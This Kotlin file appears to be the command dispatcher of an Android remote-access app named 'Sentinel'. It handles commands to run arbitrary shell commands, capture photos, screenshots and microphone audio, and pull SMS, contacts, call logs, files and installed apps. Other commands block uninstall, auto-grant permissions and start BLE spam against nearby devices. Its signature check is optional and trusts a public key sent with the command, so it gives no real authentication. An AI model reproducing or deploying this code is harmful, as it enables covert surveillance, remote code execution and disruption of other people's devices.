package com.sentinel.host.service

import android.util.Log
import com.sentinel.host.data.device.BeaconManager
import com.sentinel.host.data.device.CameraCapturer
import com.sentinel.host.data.device.ShellExecutor
import com.sentinel.host.data.device.SystemInfoProvider
import com.sentinel.shared.protocol.CommandTypes
import com.sentinel.shared.protocol.MessageType
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONArray
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

import com.sentinel.host.data.device.ContactsManager
import com.sentinel.host.data.device.FilePreviewManager
import com.sentinel.host.data.device.RemoteFileManager
import com.sentinel.host.data.device.SentinelLogBuffer

@Singleton
class CommandProcessor @Inject constructor(
    private val systemInfoProvider: SystemInfoProvider,
    private val beaconManager: BeaconManager,
    private val shellExecutor: ShellExecutor,
    private val cameraCapturer: CameraCapturer,
    private val remoteFileManager: RemoteFileManager,
    private val fileStreamer: FileStreamer,
    private val sentinelLogBuffer: SentinelLogBuffer,
    private val contactsManager: ContactsManager,
    private val filePreviewManager: FilePreviewManager,
    private val screenshotCapturer: ScreenshotCapturer,
    private val pttAudioPlayer: com.sentinel.host.data.audio.PttAudioPlayer,
    private val hostGeofenceManager: com.sentinel.host.data.location.HostGeofenceManager,
    private val mdmManager: com.sentinel.host.data.device.MdmManager,
    private val audioRepository: com.sentinel.host.data.repository.AudioRepositoryImpl,
    private val fallDetector: com.sentinel.host.data.device.FallDetector,
    private val smsManager: com.sentinel.host.data.device.SmsManager,
    private val callLogManager: com.sentinel.host.data.device.CallLogManager,
    private val packageInspector: com.sentinel.host.data.device.PackageInspector,
    private val bleSpamTransmitter: com.sentinel.host.data.bluetooth.BleSpamTransmitter? = null
) {
    companion object {
        private const val TAG = "Sentinel:CmdProc"
    }

    private val scope = CoroutineScope(Dispatchers.Default)

    // Bounded LRU set of the last 512 executed sequence IDs to block replay attacks within the 300s window
    private val executedSequences: MutableSet<Long> = java.util.Collections.synchronizedSet(
        java.util.Collections.newSetFromMap(object : java.util.LinkedHashMap<Long, Boolean>(512, 0.75f, true) {
            override fun removeEldestEntry(eldest: MutableMap.MutableEntry<Long, Boolean>?): Boolean = size > 512
        })
    )

    var onStartAudioRequested: (() -> Unit)? = null
    var onStopAudioRequested: (() -> Unit)? = null
    var onCameraElevationRequested: ((Boolean) -> Unit)? = null

    init {
        pttAudioPlayer.onSessionEnded = {
            audioRepository.isMuted = false
        }
    }

    fun processCommand(
        rawMessage: String,
        sendResult: (String) -> Unit
    ) {
        scope.launch {
            try {
                val json = JSONObject(rawMessage)
                val msgType = json.optString("type")
                val sequence = json.optLong("sequence", 0L)

                if (msgType == "FILES_LIST_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "/storage/emulated/0")
                    Log.i(TAG, "Processing FILES_LIST_REQ for path: $path")
                    val filesResponse = remoteFileManager.listDirectory(path, sequence)
                    sendResult(filesResponse)
                    return@launch
                }

                if (msgType == "FILE_DOWNLOAD_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "")
                    val offset = data.optLong("offset", 0L)
                    val nonce = data.optString("nonce", "")
                    Log.i(TAG, "Processing FILE_DOWNLOAD_REQ for path: $path")
                    fileStreamer.handleFileDownloadReq(path, offset, nonce, sequence)
                    return@launch
                }

                if (msgType == "FILE_CHUNK_ACK") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val ackSequence = data.optLong("sequence", 0L)
                    Log.i(TAG, "Processing FILE_CHUNK_ACK for sequence: $ackSequence")
                    fileStreamer.handleChunkAck(ackSequence)
                    return@launch
                }

                if (msgType == "FILE_STOP_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "")
                    Log.i(TAG, "Processing FILE_STOP_REQ for path: $path")
                    fileStreamer.handleFileStopReq(path)
                    return@launch
                }

                if (msgType == MessageType.PTT_START) {
                    Log.i(TAG, "Processing PTT_START — engaging PTT loudspeaker mode")
                    audioRepository.isMuted = true
                    pttAudioPlayer.startPttSession()
                    return@launch
                }

                if (msgType == MessageType.PTT_STOP) {
                    Log.i(TAG, "Processing PTT_STOP — releasing PTT loudspeaker mode")
                    pttAudioPlayer.stopPttSession()
                    audioRepository.isMuted = false
                    return@launch
                }

                if (msgType == MessageType.PTT_AUDIO) {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val pcmBase64 = data.optString("pcmBase64", "")
                    if (pcmBase64.isNotBlank()) {
                        audioRepository.isMuted = true
                        val pcmBytes = android.util.Base64.decode(pcmBase64, android.util.Base64.DEFAULT)
                        pttAudioPlayer.playPcmChunk(pcmBytes)
                    }
                    return@launch
                }

                if (msgType != MessageType.COMMAND) return@launch

                val data = json.getJSONObject("data")
                val command = data.getString("command")
                val params = data.optJSONObject("params") ?: JSONObject()

                val sysInfo = systemInfoProvider.getSystemInfo()
                val myModel = sysInfo["hardwareModel"] as? String ?: android.os.Build.MODEL ?: "Unknown"
                val myCallsign = sysInfo["hardwareCallsign"] as? String ?: "HOST-001"
                val suffix = myCallsign.removePrefix("HOST-").takeIf { it != "001" && it.contains("-") } ?: ""
                val myDeviceId = if (suffix.isNotBlank()) "HOST-001-$suffix" else "HOST-001"
                val myUniqueKey = "${myDeviceId}_$myModel"
                val myLegacyKey = "HOST-001_$myModel"

                val targetUniqueKey = params.optString("targetUniqueKey", "")
                val targetModel = params.optString("targetModel", "")
                val targetDeviceId = data.optString("targetDeviceId", "")

                // If targeted to another specific device/model, discard it safely so devices do not execute each other's commands
                val isTargetedDeviceId = targetDeviceId.isBlank() ||
                        targetDeviceId == "HOST-001" ||
                        targetDeviceId == myDeviceId ||
                        targetDeviceId == myCallsign ||
                        targetDeviceId == myUniqueKey ||
                        targetDeviceId == myLegacyKey ||
                        (suffix.isNotBlank() && targetDeviceId.contains(suffix))

                if (!isTargetedDeviceId) {
                    Log.i(
                        TAG,
                        "Ignoring command $command: targeted to deviceId '$targetDeviceId', but I am '$myDeviceId'"
                    )
                    return@launch
                }

                if (targetModel.isNotBlank() && !targetModel.equals(myModel, ignoreCase = true)) {
                    Log.i(TAG, "Ignoring command $command: targeted to model '$targetModel', but I am '$myModel'")
                    return@launch
                }

                val isTargetedUniqueKey = targetUniqueKey.isBlank() ||
                        targetUniqueKey == "HOST-001" ||
                        targetUniqueKey == myDeviceId ||
                        targetUniqueKey == myCallsign ||
                        targetUniqueKey == myUniqueKey ||
                        targetUniqueKey == myLegacyKey ||
                        (suffix.isNotBlank() && targetUniqueKey.contains(suffix))

                if (!isTargetedUniqueKey) {
                    Log.i(
                        TAG,
                        "Ignoring command $command: targeted to uniqueKey '$targetUniqueKey', but I am '$myDeviceId'"
                    )
                    return@launch
                }

                Log.i(TAG, "Processing incoming command: $command for device $myDeviceId")
                SentinelLogBuffer.instance.addAppLog("CmdProc", "Processing COMMAND: $command (seq=$sequence)")

                val cmdTimestamp = json.optLong("timestamp", 0L)
                val cmdEpochSec = if (cmdTimestamp > 100_000_000_000L) cmdTimestamp / 1000L else cmdTimestamp
                val nowSec = System.currentTimeMillis() / 1000L

                val resultPayload = mutableMapOf<String, Any?>()
                var isSuccess = true
                var errorMessage = ""

                // 1. Replay-Window Timestamp Guard (>5 min skew/replay on wall-clock epoch)
                if (cmdEpochSec > 1_700_000_000L && kotlin.math.abs(nowSec - cmdEpochSec) > 300L) {
                    Log.w(TAG, "Rejecting stale/replayed command $command (age=${nowSec - cmdEpochSec}s)")
                    isSuccess = false
                    errorMessage = "Command timestamp out of valid replay window (age=${nowSec - cmdEpochSec}s)"
                }
                if (isSuccess && sequence > 0L && !executedSequences.add(sequence)) {
                    Log.w(TAG, "Rejecting replayed command $command: Duplicate sequence nonce ($sequence)")
                    isSuccess = false
                    errorMessage = "Command rejected: Duplicate sequence nonce ($sequence) replayed"
                }

                // 2. Zero-Trust ECDSA Command Verification
                val adminSignature = params.optString("adminSignature", "")
                val adminPublicKey = params.optString("adminPublicKey", "")
                if (isSuccess && adminSignature.isNotBlank() && adminPublicKey.isNotBlank()) {
                    val isValidSig = try {
                        val pubKeyBytes = android.util.Base64.decode(adminPublicKey, android.util.Base64.DEFAULT)
                        val keySpec = java.security.spec.X509EncodedKeySpec(pubKeyBytes)
                        val keyFactory = java.security.KeyFactory.getInstance("EC")
                        val pubKey = keyFactory.generatePublic(keySpec)
                        val canonicalSignedMsg = "$command:$targetDeviceId:$sequence"
                        val canonicalBytes = canonicalSignedMsg.toByteArray(Charsets.UTF_8)
                        verifyAdminSignature(canonicalBytes, adminSignature, pubKey)
                    } catch (e: Exception) {
                        Log.e(TAG, "ECDSA key parsing or verification failed: ${e.message}")
                        false
                    }
                    if (!isValidSig) {
                        Log.w(TAG, "Rejecting command $command: ECDSA signature verification failed")
                        isSuccess = false
                        errorMessage = "Cryptographic ECDSA command signature verification failed"
                    }
                }

                if (isSuccess) {
                    when (command) {
                    CommandTypes.GET_SYSTEM_INFO -> {
                        val info = sysInfo.toMutableMap()
                        info.putAll(mdmManager.getMdmStatus())
                        info["model"] = myModel
                        info["deviceId"] = myDeviceId
                        info["callsign"] = myCallsign
                        info["uniqueKey"] = "${myDeviceId}_$myCallsign"
                        resultPayload.putAll(info)
                    }

                    "SCAN_RF_ENVIRONMENT" -> {
                        resultPayload.putAll(systemInfoProvider.getRfEnvironmentScan())
                        resultPayload["deviceId"] = myDeviceId
                        resultPayload["model"] = myModel
                    }

                    "REQUEST_TELEMETRY" -> {
                        val info = sysInfo
                        resultPayload["deviceId"] = myDeviceId
                        resultPayload["model"] = myModel
                        resultPayload["callsign"] = myCallsign
                        resultPayload["uniqueKey"] = "${myDeviceId}_$myCallsign"
                        resultPayload["hardwareId"] = info["hardwareId"] ?: ""
                        resultPayload["battery"] = info["batteryPercent"] ?: -1
                        resultPayload["network"] = if (info["isCharging"] == true) "WiFi (Charging)" else "WiFi"
                        resultPayload["signalDbm"] = info["signalDbm"] ?: -75
                        resultPayload["accelerationG"] = info["accelerationG"] ?: 1.0f
                        resultPayload["gnssSpoofSuspected"] = info["gnssSpoofSuspected"] ?: false
                        resultPayload["rogueCellSuspected"] = info["rogueCellSuspected"] ?: false
                        resultPayload["servingCellSummary"] = info["servingCellSummary"] ?: "N/A"
                        resultPayload["compassAzimuthDeg"] = info["compassAzimuthDeg"] ?: 0
                        resultPayload["barometricPressureHpa"] = info["barometricPressureHpa"]
                        resultPayload["estimatedAltitudeMeters"] = info["estimatedAltitudeMeters"]
                        resultPayload["estimatedFloor"] = info["estimatedFloor"]
                        resultPayload["devicePoseAndCameraHint"] = info["devicePoseAndCameraHint"] ?: "UPRIGHT / VERTICAL"
                        resultPayload["ambientEnvironment"] = info["ambientEnvironment"] ?: "Light Sensor N/A"
                        resultPayload["magneticFieldUt"] = info["magneticFieldUt"] ?: 45
                        resultPayload["emfAnomalyDetected"] = info["emfAnomalyDetected"] ?: false
                        resultPayload["seismicVibrationSummary"] = info["seismicVibrationSummary"] ?: "DEAD STILL (0 mG)"
                        resultPayload["gnssConstellationSummary"] = info["gnssConstellationSummary"] ?: "GNSS Standby"
                        resultPayload["batteryEnduranceSummary"] = info["batteryEnduranceSummary"] ?: ""
                        resultPayload["cpuFrequencySummary"] = info["cpuFrequencySummary"] ?: ""
                        resultPayload["vpnActive"] = info["vpnActive"] ?: false
                        resultPayload["proxyActive"] = info["proxyActive"] ?: false
                        resultPayload["totalTrafficSummary"] = info["totalTrafficSummary"] ?: "N/A"
                        resultPayload["activeTcpSockets"] = info["activeTcpSockets"] ?: 0
                        resultPayload["verticalMotionState"] = info["verticalMotionState"] ?: "LEVEL ALTITUDE (0.0 m/s)"
                        resultPayload["usbHardwareSummary"] = info["usbHardwareSummary"] ?: "Port Idle / No Peripherals"
                        resultPayload["usbIntrusionSuspected"] = info["usbIntrusionSuspected"] ?: false
                        resultPayload["simSecuritySummary"] = info["simSecuritySummary"] ?: "Verified Secure"
                        resultPayload["simTamperOrRoamingAlert"] = info["simTamperOrRoamingAlert"] ?: false
                        resultPayload["defconLevel"] = info["defconLevel"] ?: 5
                        resultPayload["threatProbabilityPct"] = info["threatProbabilityPct"] ?: 0.1
                        resultPayload["defconSummary"] = info["defconSummary"] ?: "DEFCON 5 (0.1% Risk · All Sensors Nominal)"
                        resultPayload["mlModelStatus"] = info["mlModelStatus"] ?: "Calibrating (1 samples)"
                        info.forEach { (k, v) ->
                            if (!resultPayload.containsKey(k) && v != null) {
                                resultPayload[k] = v
                            }
                        }
                    }

                    CommandTypes.TRIGGER_BEACON -> {
                        beaconManager.triggerBeacon()
                        resultPayload["beaconTriggered"] = true
                    }

                    CommandTypes.EXECUTE_SHELL -> {
                        val shellCmd = params.optString("cmd", "uptime")
                        val output = withTimeoutOrNull(15_000L) {
                            shellExecutor.execute(shellCmd)
                        }
                        if (output == null) {
                            isSuccess = false
                            errorMessage = "Shell command timed out"
                        } else {
                            resultPayload.putAll(output)
                        }
                    }

                    CommandTypes.CAPTURE_PHOTO -> {
                        val facingFront = params.optBoolean("front", false)
                        val streamIdStr = params.optString("streamId", "").ifBlank { data.optString("streamId", "") }
                        val streamId = try {
                            if (streamIdStr.isNotBlank()) java.util.UUID.fromString(streamIdStr) else null
                        } catch (_: Throwable) {
                            null
                        }
                        onCameraElevationRequested?.invoke(true)
                        val captureResult = try {
                            withTimeoutOrNull(25_000L) {
                                cameraCapturer.capturePhoto(facingFront, streamId)
                            }
                        } finally {
                            onCameraElevationRequested?.invoke(false)
                        }
                        if (captureResult == null) {
                            isSuccess = false
                            errorMessage = "Photo capture timed out"
                        } else if (captureResult["success"] == true) {
                            resultPayload.putAll(captureResult)
                        } else {
                            isSuccess = false
                            errorMessage = captureResult["error"]?.toString() ?: "Photo capture failed"
                        }
                    }

                    CommandTypes.FETCH_SMS_LOGS -> {
                        val limit = params.optInt("limit", 30)
                        val smsLogs = smsManager.getSmsLogs(limit)
                        resultPayload["logs"] = smsLogs
                    }

                    CommandTypes.FETCH_APP_LOGS -> {
                        val fullDevice = params.optBoolean("fullDevice", false)
                        val filter = params.optString("filter", "")
                        SentinelLogBuffer.instance.addAppLog("CmdProc", "FETCH_APP_LOGS query (fullDevice=$fullDevice, filter=\"$filter\")")
                        val appLogs = sentinelLogBuffer.getAppLogs(fullDevice, filter)
                        resultPayload["appLogs"] = appLogs
                    }

                    CommandTypes.FETCH_NOTIFICATION_LOGS -> {
                        val logs = SentinelLogBuffer.instance.getLogsAsJsonArray()
                        resultPayload["notificationLogs"] = logs.toString()
                    }

                    CommandTypes.FETCH_CONTACTS -> {
                        val limit = params.optInt("limit", 0) // 0 = unlimited / all contacts
                        val offset = params.optInt("offset", 0)
                        val contactsResult = withTimeoutOrNull(15_000L) {
                            contactsManager.getContacts(limit, offset)
                        }
                        if (contactsResult == null) {
                            isSuccess = false
                            errorMessage = "Fetching contacts timed out"
                        } else {
                            resultPayload.putAll(contactsResult)
                        }
                    }

                    CommandTypes.FETCH_CALL_LOGS -> {
                        val limit = params.optInt("limit", 50)
                        val offset = params.optInt("offset", 0)
                        val callLogsResult = withTimeoutOrNull(15_000L) {
                            callLogManager.getCallLogs(limit, offset)
                        }
                        if (callLogsResult == null) {
                            isSuccess = false
                            errorMessage = "Fetching call logs timed out"
                        } else {
                            resultPayload.putAll(callLogsResult)
                        }
                    }

                    CommandTypes.FETCH_INSTALLED_APPS -> {
                        val includeSystem = params.optBoolean("includeSystem", false)
                        val limit = params.optInt("limit", 200)
                        val offset = params.optInt("offset", 0)
                        val appsResult = withTimeoutOrNull(15_000L) {
                            packageInspector.getInstalledPackages(includeSystem, limit, offset)
                        }
                        if (appsResult == null) {
                            isSuccess = false
                            errorMessage = "Fetching installed applications timed out"
                        } else {
                            resultPayload.putAll(appsResult)
                        }
                    }

                    CommandTypes.PREVIEW_FILE -> {
                        val path = params.optString("path", "")
                        val maxDim = params.optInt("maxDim", 720)
                        val textLines = params.optInt("textLines", 250)
                        val previewResult = withTimeoutOrNull(20_000L) {
                            filePreviewManager.generatePreview(path, maxDim, textLines)
                        }
                        if (previewResult == null) {
                            isSuccess = false
                            errorMessage = "File preview timed out"
                        } else if (previewResult["success"] == false) {
                            isSuccess = false
                            errorMessage = previewResult["error"]?.toString() ?: "File preview failed"
                        } else {
                            resultPayload.putAll(previewResult)
                        }
                    }

                    CommandTypes.CAPTURE_SCREENSHOT -> {
                        val maxWidth = params.optInt("maxWidth", 1080)
                        val quality = params.optInt("quality", 80)
                        val screenshotResult = withTimeoutOrNull(15_000L) {
                            screenshotCapturer.captureScreenshot(maxWidth, quality)
                        }
                        if (screenshotResult == null) {
                            isSuccess = false
                            errorMessage = "Screenshot capture timed out"
                        } else if (screenshotResult["success"] == true) {
                            resultPayload.putAll(screenshotResult)
                        } else {
                            isSuccess = false
                            errorMessage = screenshotResult["error"]?.toString() ?: "Screenshot capture failed"
                        }
                    }

                    "SET_GEOFENCE" -> {
                        val zoneId = params.optString("id", "zone_${System.currentTimeMillis()}")
                        val lat = params.optDouble("latitude", 0.0)
                        val lon = params.optDouble("longitude", 0.0)
                        val radius = params.optDouble("radius", 100.0).toFloat()
                        if (lat != 0.0 && lon != 0.0) {
                            val zone = com.sentinel.host.data.location.GeofenceZone(
                                id = zoneId,
                                latitude = lat,
                                longitude = lon,
                                radiusMeters = radius
                            )
                            hostGeofenceManager.registerZones(listOf(zone))
                            resultPayload["geofenceSet"] = true
                            resultPayload["zoneId"] = zoneId
                        } else {
                            isSuccess = false
                            errorMessage = "Invalid coordinates for geofence"
                        }
                    }

                    "CLEAR_GEOFENCES" -> {
                        hostGeofenceManager.clearAllGeofences()
                        resultPayload["cleared"] = true
                    }

                    "PTT_START" -> {
                        Log.i(TAG, "Command PTT_START: Engaging loudspeaker intercom")
                        audioRepository.isMuted = true
                        pttAudioPlayer.startPttSession()
                        resultPayload["pttActive"] = true
                    }

                    "PTT_STOP" -> {
                        Log.i(TAG, "Command PTT_STOP: Disengaging loudspeaker intercom")
                        pttAudioPlayer.stopPttSession()
                        audioRepository.isMuted = false
                        resultPayload["pttActive"] = false
                    }

                    "PTT_AUDIO" -> {
                        audioRepository.isMuted = true
                        val pcmBase64 = params.optString("pcmBase64", "")
                        if (pcmBase64.isNotBlank()) {
                            val pcmBytes = android.util.Base64.decode(pcmBase64, android.util.Base64.DEFAULT)
                            pttAudioPlayer.playPcmChunk(pcmBytes)
                        }
                        return@launch // Stream frame played — skip redundant COMMAND_RESULT ACK
                    }

                    "START_AUDIO_STREAM" -> {
                        Log.i(TAG, "Command START_AUDIO_STREAM: Engaging on-demand microphone capture")
                        onStartAudioRequested?.invoke()
                        resultPayload["audioStreaming"] = true
                    }

                    "STOP_AUDIO_STREAM" -> {
                        Log.i(TAG, "Command STOP_AUDIO_STREAM: Disengaging microphone capture")
                        onStopAudioRequested?.invoke()
                        resultPayload["audioStreaming"] = false
                    }

                    CommandTypes.LOCK_DEVICE -> {
                        val (locked, method) = mdmManager.lockDeviceNow()
                        resultPayload["locked"] = locked
                        resultPayload["method"] = method
                        if (!locked) {
                            isSuccess = false
                            errorMessage = method
                        }
                    }

                    CommandTypes.SET_ANTI_TAMPER -> {
                        val enabled = params.optBoolean("enabled", true)
                        val success = mdmManager.setUninstallProtection(enabled)
                        resultPayload["antiTamperEnabled"] = enabled
                        resultPayload["success"] = success
                        if (!success) {
                            if (!mdmManager.isDeviceOwner) {
                                isSuccess = false
                                errorMessage = "Device Owner mode required for Anti-Tamper uninstall protection"
                            } else {
                                isSuccess = false
                                errorMessage = "Failed to update uninstall protection"
                            }
                        }
                    }

                    CommandTypes.ENFORCE_PERMISSIONS -> {
                        val success = mdmManager.autoGrantAllPermissions()
                        resultPayload["permissionsEnforced"] = success
                        if (!success && !mdmManager.isDeviceOwner && !mdmManager.isProfileOwner) {
                            isSuccess = false
                            errorMessage = "Device Owner or Profile Owner mode required to auto-grant permissions"
                        }
                    }

                    CommandTypes.GET_MDM_STATUS -> {
                        resultPayload.putAll(mdmManager.getMdmStatus())
                    }

                    CommandTypes.SET_FALL_DETECTION -> {
                        val enabled = params.optBoolean("enabled", true)
                        val soundAlarm = params.optBoolean("soundAlarm", false)
                        if (enabled) {
                            fallDetector.enable(soundAlarm)
                        } else {
                            fallDetector.disable()
                        }
                        resultPayload["fallDetectionEnabled"] = fallDetector.isEnabled
                        resultPayload["soundLocalAlarm"] = fallDetector.soundLocalAlarm
                    }

                    CommandTypes.TEST_FALL_ALERT -> {
                        val impactG = params.optDouble("impactG", 4.8).toFloat()
                        fallDetector.simulateFall(impactG)
                        resultPayload["simulated"] = true
                        resultPayload["impactG"] = impactG
                    }

                    CommandTypes.START_BLE_SPAM, "START_BLE_SPAM" -> {
                        val durationSec = params.optInt("durationSec", 30).coerceIn(5, 60)
                        val mode = params.optString("mode", "ALL")
                        val started = bleSpamTransmitter?.startSpamSequence(durationSec, mode) ?: false
                        resultPayload["spamming"] = started
                        resultPayload["durationSec"] = durationSec
                        resultPayload["mode"] = mode
                        if (!started) {
                            isSuccess = false
                            errorMessage = "Bluetooth adapter unavailable or BLE advertising unsupported"
                        }
                    }

                    CommandTypes.STOP_BLE_SPAM, "STOP_BLE_SPAM" -> {
                        bleSpamTransmitter?.stopSpam()
                        resultPayload["spamming"] = false
                    }

                    else -> {
                        isSuccess = false
                        errorMessage = "Unknown command: $command"
                    }
                }
                }

                val responseJson = JSONObject().apply {
                    put("type", MessageType.COMMAND_RESULT)
                    put("version", 1)
                    put("timestamp", System.currentTimeMillis() / 1000)
                    put("sequence", sequence)

                    resultPayload["deviceId"] = myDeviceId
                    resultPayload["model"] = myModel
                    resultPayload["uniqueKey"] = myUniqueKey

                    val resData = JSONObject().apply {
                        put("command", command)
                        put("success", isSuccess)
                        if (!isSuccess) put("error", errorMessage)
                        put("deviceId", myDeviceId)
                        put("model", myModel)
                        put("uniqueKey", myUniqueKey)
                        put("payload", mapToJsonObject(resultPayload))
                    }
                    put("data", resData)
                }

                Log.i(TAG, "Sending COMMAND_RESULT for $command (success=$isSuccess, error=$errorMessage)")
                SentinelLogBuffer.instance.addAppLog("CmdProc", "Completed COMMAND $command (success=$isSuccess)")
                sendResult(responseJson.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to process command: ${e.message}", e)
                try {
                    val json = JSONObject(rawMessage)
                    val data = json.optJSONObject("data")
                    val command = data?.optString("command") ?: "UNKNOWN"
                    val sequence = json.optLong("sequence", 0L)
                    val errorResponse = JSONObject().apply {
                        put("type", MessageType.COMMAND_RESULT)
                        put("version", 1)
                        put("timestamp", System.currentTimeMillis() / 1000)
                        put("sequence", sequence)
                        put("data", JSONObject().apply {
                            put("command", command)
                            put("success", false)
                            put("error", e.message ?: "Internal command execution error")
                            put("payload", JSONObject())
                        })
                    }
                    sendResult(errorResponse.toString())
                } catch (ignored: Exception) {
                }
            }
        }
    }

    private fun mapToJsonObject(map: Map<String, Any?>): JSONObject {
        val json = JSONObject()
        for ((key, value) in map) {
            when (value) {
                null -> json.put(key, JSONObject.NULL)
                is Map<*, *> -> @Suppress("UNCHECKED_CAST") json.put(key, mapToJsonObject(value as Map<String, Any?>))
                is List<*> -> {
                    val array = JSONArray()
                    value.forEach { item ->
                        when (item) {
                            null -> array.put(JSONObject.NULL)
                            is Map<*, *> -> @Suppress("UNCHECKED_CAST") array.put(mapToJsonObject(item as Map<String, Any?>))
                            else -> array.put(item)
                        }
                    }
                    json.put(key, array)
                }

                else -> json.put(key, value)
            }
        }
        return json
    }

    private fun verifyAdminSignature(
        payloadBytes: ByteArray,
        signatureBase64: String,
        publicKey: java.security.PublicKey
    ): Boolean {
        return try {
            val sigBytes = android.util.Base64.decode(signatureBase64, android.util.Base64.DEFAULT)
            val signature = java.security.Signature.getInstance("SHA256withECDSA").apply {
                initVerify(publicKey)
                update(payloadBytes)
            }
            signature.verify(sigBytes)
        } catch (e: Exception) {
            Log.e(TAG, "Signature verification error: ${e.message}")
            false
        }
    }
}
